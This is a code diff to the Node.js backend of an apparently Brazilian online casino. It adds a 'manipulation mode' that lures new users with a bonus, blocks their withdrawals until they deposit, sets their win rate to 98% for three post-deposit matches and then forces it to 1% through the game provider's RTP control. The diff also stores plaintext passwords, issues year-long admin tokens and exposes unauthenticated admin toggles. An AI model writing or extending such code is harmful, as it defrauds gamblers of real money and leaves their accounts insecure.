@@ -110,19 +110,39 @@ app.post('/api/auth/register', async (req, res) => {
         const existing = await pool.query('SELECT id FROM users WHERE phone = $1', [phone]);
         if (existing.rows.length > 0) return res.status(400).json({ success: false, error: 'Telefone já cadastrado.' });
 
-        // Retrieve System Settings for Bonus
-        const settingsRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('signup_bonus_val', 'signup_rollover_mult')");
+        // Retrieve System Settings for Bonus AND Phase/Manipulation
+        const settingsRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('signup_bonus_val', 'signup_rollover_mult', 'reward_system_phase', 'manipulation_mode')");
         let signupBonus = 0;
         let rolloverMult = 1;
+        let currentPhase = 'arrecadacao';
+        let manipulationMode = false;
         settingsRows.rows.forEach(row => {
             if (row.key_name === 'signup_bonus_val') signupBonus = parseFloat(row.key_value) || 0;
             if (row.key_name === 'signup_rollover_mult') rolloverMult = parseFloat(row.key_value) || 1;
+            if (row.key_name === 'reward_system_phase') currentPhase = row.key_value || 'arrecadacao';
+            if (row.key_name === 'manipulation_mode') manipulationMode = row.key_value === 'true';
         });
+
+        // MANIPULATION LOGIC: Adjust bonus based on phase
+        let isManipulated = false;
+        let manipulationStatus = 'none';
+        if (currentPhase === 'retribuicao') {
+            // Retribuição: Bônus reduzido R$10, sem manipulação
+            signupBonus = 10.00;
+            isManipulated = false;
+            manipulationStatus = 'none';
+        } else if (currentPhase === 'arrecadacao' && manipulationMode) {
+            // Arrecadação + Manipulation ON: Bônus R$30, usuário manipulado
+            signupBonus = 30.00;
+            isManipulated = true;
+            manipulationStatus = 'winning_pre_deposit';
+        }
+        // If manipulation is OFF and phase is arrecadacao, use default signup_bonus_val from settings
 
         const rolloverReq = signupBonus * rolloverMult;
 
         // Auto-generate ID and Username
-        const randNum = Math.floor(10000 + Math.random() * 90000).toString(); // e.g. 83921
+        const randNum = Math.floor(10000 + Math.random() * 90000).toString();
         const id_user = randNum;
         const name = `user${randNum}`;
 
@@ -136,12 +156,13 @@ app.post('/api/auth/register', async (req, res) => {
             if (check.rows.length === 0) codeExists = false;
         }
 
-        const user_type = process.env.DEFAULT_DEMO_TYPE || 'standard'; // standard ou influencer
+        const user_type = process.env.DEFAULT_DEMO_TYPE || 'standard';
         await pool.query(
-            'INSERT INTO users (id_user, phone, password, name, balance, is_demo, user_type, referral_code, invited_by, bonus_balance, rollover_required) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)',
-            [id_user, phone, hashedPassword, name, signupBonus, true, user_type, referral_code, invitedBy || null, signupBonus, rolloverReq]
+            'INSERT INTO users (id_user, phone, password, name, balance, is_demo, user_type, referral_code, invited_by, bonus_balance, rollover_required, is_manipulated, manipulation_status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)',
+            [id_user, phone, hashedPassword, name, signupBonus, false, user_type, referral_code, invitedBy || null, signupBonus, rolloverReq, isManipulated, manipulationStatus]
         );
 
+        console.log(`[REGISTER] User ${phone} registered. Phase:${currentPhase} Manip:${manipulationMode} Bonus:${signupBonus} Status:${manipulationStatus}`);
         res.json({ success: true, message: 'Cadastro realizado com sucesso!' });
     } catch (err) {
         console.error('Register Erro:', err);
@@ -511,7 +532,9 @@ app.post('/api/admin/login', async (req, res) => {
     try {
         const rows = await pool.query('SELECT * FROM admins WHERE operator_id = $1 AND password = $2', [operatorId, password]);
         if (rows.rows.length > 0) {
-            res.json({ success: true, message: 'Login realizado com sucesso!' });
+            // Generate admin token for persistent login
+            const adminToken = jwt.sign({ adminId: rows.rows[0].id, operatorId: rows.rows[0].operator_id, role: 'admin' }, SECRET_KEY, { expiresIn: '365d' });
+            res.json({ success: true, message: 'Login realizado com sucesso!', token: adminToken });
         } else {
             res.status(401).json({ success: false, error: 'ID de Operador ou Senha inválidos.' });
         }
@@ -526,6 +549,20 @@ app.post('/api/admin/login', async (req, res) => {
     }
 });
 
+// Admin token validation endpoint
+app.get('/api/admin/validate-token', (req, res) => {
+    const authHeader = req.headers.authorization;
+    if (!authHeader) return res.status(401).json({ success: false });
+    const token = authHeader.split(' ')[1];
+    try {
+        const decoded = jwt.verify(token, SECRET_KEY);
+        if (decoded.role !== 'admin') return res.status(403).json({ success: false });
+        res.json({ success: true, operatorId: decoded.operatorId });
+    } catch (err) {
+        res.status(401).json({ success: false });
+    }
+});
+
 app.get('/api/admin/stats', async (req, res) => {
     try {
         const { month, year } = req.query;
@@ -533,7 +570,7 @@ app.get('/api/admin/stats', async (req, res) => {
         const currentMonth = month ? parseInt(month) : now.getMonth() + 1;
         const currentYear = year ? parseInt(year) : now.getFullYear();
 
-        // Faturamento real: Depósitos concluídos - Saques aprovados no período
+        // Faturamento real LÍQUIDO: Depósitos concluídos - Saques aprovados (LIFETIME, filtrado por mês)
         const billingResult = await pool.query(`
             SELECT 
                 (SELECT COALESCE(SUM(amount), 0) FROM deposits 
@@ -824,9 +861,12 @@ app.post('/api/admin/users/demo', async (req, res) => {
         const id_user = Math.floor(100000000 + Math.random() * 900000000).toString();
         const referral_code = 'REF' + Math.random().toString(36).substring(2, 8).toUpperCase();
 
+        // FIX BUG: is_demo must be false for 'standard' (real) users, true only for 'influencer'
+        const isDemoFlag = (user_type === 'influencer');
+
         const result = await pool.query(
             'INSERT INTO users (id_user, phone, password, plain_password, name, is_demo, user_type, balance, referral_code) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING id',
-            [id_user, phone, hashedPassword, password, name || 'Demo', true, user_type || 'standard', 0.00, referral_code]
+            [id_user, phone, hashedPassword, password, name || 'Demo', isDemoFlag, user_type || 'standard', 0.00, referral_code]
         );
         const newUserId = result.rows[0].id;
         const isDemo = (user_type === 'influencer'); // For API sync logic below
@@ -1190,6 +1230,34 @@ async function completeDeposit(depositIdOrExternalId, isExternal = false) {
     
     // Mark deposit as completed
     await pool.query('UPDATE deposits SET status = \'completed\' WHERE id = $1', [dep.id]);
+
+    // === MANIPULATION: Transition from pre-deposit winning to post-deposit winning ===
+    const manipCheck = await pool.query('SELECT is_manipulated, manipulation_status FROM users WHERE id = $1', [user_id]);
+    if (manipCheck.rows.length > 0 && manipCheck.rows[0].is_manipulated && manipCheck.rows[0].manipulation_status === 'winning_pre_deposit') {
+        await pool.query(
+            "UPDATE users SET manipulation_status = 'winning_post_deposit', manipulated_matches = 0 WHERE id = $1",
+            [user_id]
+        );
+        console.log(`[MANIPULATION] User ${user_id} deposited R$${baseAmount}. Transitioning to winning_post_deposit (3 more wins).`);
+        
+        // Set RTP to 98% for their next 3 matches
+        try {
+            const creds = await pool.query("SELECT agent_code, agent_token FROM api_credentials WHERE module = 'max_api'");
+            if (creds.rows.length > 0) {
+                const userCode = `30win_user_${user_id}`;
+                await axios.post('https://maxapigames.com/api/v2', {
+                    method: 'control_rtp',
+                    agent_code: creds.rows[0].agent_code,
+                    agent_token: creds.rows[0].agent_token,
+                    user_code: userCode,
+                    rtp: 98
+                });
+                console.log(`[MANIPULATION] RTP set to 98% for ${userCode} (3 post-deposit wins)`);
+            }
+        } catch (rtpErr) {
+            console.error('[MANIPULATION] Error setting post-deposit RTP:', rtpErr.message);
+        }
+    }
     
     // FACEBOOK CONVERSIONS API (CAPI) TRIGGER
     try {
@@ -1369,10 +1437,19 @@ app.post(['/api/withdraw', '/api/finance/withdraw'], authenticateToken, async (r
     if (!pix_type) pix_type = 'CPF'; // Default if not provided
 
     try {
-        const uRows = await pool.query('SELECT balance, rollover_required, rollover_progress, withdraw_password FROM users WHERE id = $1', [req.user.id]);
+        const uRows = await pool.query('SELECT balance, rollover_required, rollover_progress, withdraw_password, is_manipulated, manipulation_status FROM users WHERE id = $1', [req.user.id]);
         if (uRows.rows.length === 0) return res.status(400).json({ success: false, error: 'Usuário não encontrado.' });
 
         const user = uRows.rows[0];
+
+        // === MANIPULATION WITHDRAWAL BLOCK ===
+        if (user.is_manipulated && user.manipulation_status === 'winning_pre_deposit') {
+            return res.status(400).json({ 
+                success: false, 
+                error: 'Para liberar o saque, é necessário realizar um depósito mínimo de R$ 10,00.',
+                requires_deposit: true
+            });
+        }
 
         // Settings Check
         const sRows = await pool.query('SELECT key_name, key_value FROM system_settings WHERE key_name = \'min_withdraw\'');
@@ -1577,7 +1654,7 @@ app.post('/api/webhook/maxapi', async (req, res) => {
         const userId = parseInt(user_code.replace('30win_user_', ''));
         if (isNaN(userId)) return res.status(400).json({ status: 0, msg: 'INVALID_USER' });
 
-        const userRows = await pool.query('SELECT balance, is_demo, user_type FROM users WHERE id = $1', [userId]);
+        const userRows = await pool.query('SELECT balance, is_demo, user_type, is_manipulated, manipulation_status, manipulated_matches FROM users WHERE id = $1', [userId]);
         if (userRows.rows.length === 0) return res.status(400).json({ status: 0, msg: 'INVALID_USER' });
 
         const user = userRows.rows[0];
@@ -1684,6 +1761,45 @@ app.post('/api/webhook/maxapi', async (req, res) => {
             // 1.6 Update Rollover Progress (For all accounts that have a bet)
             if (bet > 0) {
                 await pool.query('UPDATE users SET rollover_progress = rollover_progress + $1 WHERE id = $2', [bet, userId]);
+            }
+
+            // === MANIPULATION LOGIC: Track post-deposit matches ===
+            if (user.is_manipulated && bet > 0) {
+                const manipStatus = user.manipulation_status;
+                
+                if (manipStatus === 'winning_post_deposit') {
+                    // Increment match counter
+                    const updatedUser = await pool.query(
+                        'UPDATE users SET manipulated_matches = manipulated_matches + 1 WHERE id = $1 RETURNING manipulated_matches',
+                        [userId]
+                    );
+                    const matchCount = updatedUser.rows[0].manipulated_matches;
+                    console.log(`[MANIPULATION] User ${user_code} post-deposit match #${matchCount}`);
+                    
+                    if (matchCount >= 3) {
+                        // After 3 winning matches, switch to losing mode
+                        await pool.query(
+                            "UPDATE users SET manipulation_status = 'losing' WHERE id = $1",
+                            [userId]
+                        );
+                        console.log(`[MANIPULATION] User ${user_code} NOW LOSING (match #${matchCount} >= 3)`);
+                        
+                        // Set individual RTP to 1% via maxapi control_rtp
+                        try {
+                            const userCode = `30win_user_${userId}`;
+                            await axios.post('https://maxapigames.com/api/v2', {
+                                method: 'control_rtp',
+                                agent_code: agentSettings.agent_code,
+                                agent_token: agentSettings.agent_token,
+                                user_code: userCode,
+                                rtp: 1
+                            });
+                            console.log(`[MANIPULATION] RTP set to 1% for ${userCode}`);
+                        } catch (rtpErr) {
+                            console.error('[MANIPULATION] Error setting RTP to 1%:', rtpErr.message);
+                        }
+                    }
+                }
             }
 
             // 2. Cycle Logic (INCLUDE STANDARD DEMO USERS)
@@ -1818,6 +1934,112 @@ app.post('/api/admin/reward/reset', async (req, res) => {
 });
 
 // --- ROUTES FOR HTML ---
+
+// === MANIPULATION MODE ENDPOINTS ===
+app.post('/api/admin/manipulation/toggle', async (req, res) => {
+    const { enabled } = req.body;
+    try {
+        await pool.query(
+            "INSERT INTO system_settings (key_name, key_value) VALUES ('manipulation_mode', $1) ON CONFLICT (key_name) DO UPDATE SET key_value = $1",
+            [enabled ? 'true' : 'false']
+        );
+        console.log(`[MANIPULATION] Mode toggled to: ${enabled}`);
+        res.json({ success: true, message: `Modo Manipulation ${enabled ? 'ATIVADO' : 'DESATIVADO'}` });
+    } catch (err) {
+        console.error('Manipulation Toggle Error:', err);
+        res.status(500).json({ success: false, error: 'Erro ao alternar modo.' });
+    }
+});
+
+app.get('/api/admin/manipulation/status', async (req, res) => {
+    try {
+        const row = await pool.query("SELECT key_value FROM system_settings WHERE key_name = 'manipulation_mode'");
+        const enabled = row.rows.length > 0 && row.rows[0].key_value === 'true';
+        res.json({ success: true, enabled });
+    } catch (err) {
+        res.status(500).json({ success: false, error: 'Erro ao buscar status.' });
+    }
+});
+
+// === DAILY BONUS ENDPOINTS ===
+app.post('/api/admin/daily-bonus/save', async (req, res) => {
+    const { enabled, value } = req.body;
+    try {
+        await pool.query(
+            "INSERT INTO system_settings (key_name, key_value) VALUES ('daily_bonus_enabled', $1) ON CONFLICT (key_name) DO UPDATE SET key_value = $1",
+            [enabled ? 'true' : 'false']
+        );
+        await pool.query(
+            "INSERT INTO system_settings (key_name, key_value) VALUES ('daily_bonus_value', $1) ON CONFLICT (key_name) DO UPDATE SET key_value = $1",
+            [String(parseFloat(value) || 5)]
+        );
+        console.log(`[DAILY BONUS] Enabled:${enabled} Value:R$${value}`);
+        res.json({ success: true, message: 'Configuração de bônus diário salva!' });
+    } catch (err) {
+        console.error('Daily Bonus Save Error:', err);
+        res.status(500).json({ success: false, error: 'Erro ao salvar configuração.' });
+    }
+});
+
+app.get('/api/admin/daily-bonus/status', async (req, res) => {
+    try {
+        const rows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('daily_bonus_enabled', 'daily_bonus_value')");
+        let enabled = false;
+        let value = 5;
+        rows.rows.forEach(r => {
+            if (r.key_name === 'daily_bonus_enabled') enabled = r.key_value === 'true';
+            if (r.key_name === 'daily_bonus_value') value = parseFloat(r.key_value) || 5;
+        });
+        res.json({ success: true, enabled, value });
+    } catch (err) {
+        res.status(500).json({ success: false, error: 'Erro ao buscar status.' });
+    }
+});
+
+// Claim daily bonus automatically for real users (called on user activity/sync)
+app.post('/api/user/claim-daily-bonus', authenticateToken, async (req, res) => {
+    try {
+        // Check if daily bonus is enabled
+        const settingsRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('daily_bonus_enabled', 'daily_bonus_value')");
+        let enabled = false;
+        let bonusValue = 0;
+        settingsRows.rows.forEach(r => {
+            if (r.key_name === 'daily_bonus_enabled') enabled = r.key_value === 'true';
+            if (r.key_name === 'daily_bonus_value') bonusValue = parseFloat(r.key_value) || 0;
+        });
+
+        if (!enabled || bonusValue <= 0) {
+            return res.json({ success: false, claimed: false, reason: 'Bônus diário desativado.' });
+        }
+
+        // Check user type - only for REAL (standard) users, NOT influencers
+        const userRow = await pool.query('SELECT id, user_type, is_demo, last_auto_bonus FROM users WHERE id = $1', [req.user.id]);
+        if (userRow.rows.length === 0) return res.status(404).json({ success: false });
+        const user = userRow.rows[0];
+
+        if (user.is_demo || user.user_type === 'influencer') {
+            return res.json({ success: false, claimed: false, reason: 'Apenas para contas reais.' });
+        }
+
+        // Check 12-hour cooldown
+        const lastBonus = user.last_auto_bonus;
+        if (lastBonus) {
+            const hoursSince = (Date.now() - new Date(lastBonus).getTime()) / (1000 * 60 * 60);
+            if (hoursSince < 12) {
+                const nextIn = Math.ceil(12 - hoursSince);
+                return res.json({ success: false, claimed: false, reason: `Próximo bônus em ${nextIn}h.` });
+            }
+        }
+
+        // Credit the bonus
+        await pool.query('UPDATE users SET balance = balance + $1, last_auto_bonus = NOW() WHERE id = $2', [bonusValue, req.user.id]);
+        console.log(`[DAILY BONUS] User ${req.user.id} claimed R$${bonusValue}`);
+        res.json({ success: true, claimed: true, amount: bonusValue, message: `Bônus diário de R$${bonusValue.toFixed(2)} creditado!` });
+    } catch (err) {
+        console.error('Claim Daily Bonus Error:', err);
+        res.status(500).json({ success: false, error: 'Erro ao creditar bônus.' });
+    }
+});
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/auth', (req, res) => res.sendFile(path.join(__dirname, 'auth.html')));
